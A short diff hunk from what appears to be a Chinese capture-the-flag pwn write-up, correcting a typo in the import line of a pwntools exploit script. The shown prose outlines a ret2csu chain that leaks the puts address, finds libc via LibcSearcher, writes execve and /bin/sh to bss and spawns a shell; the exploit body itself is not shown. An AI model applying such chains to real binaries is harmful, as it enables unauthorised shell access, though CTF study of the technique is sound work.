@@ -42,7 +42,7 @@ int sub_40068E()
 思路：通过`ret2csu`调用`puts`获取`puts`函数的真实地址，通过`LibcSearcher`拿到基地址，调用`read`向bss段写入`execve`和`/bin/sh\x00`，调用`execve`拿到shell
 
 ```
-rom pwn import *
+from pwn import *
 from LibcSearcher import LibcSearcher
 context(os='linux',arch='amd64',log_level='debug')
 
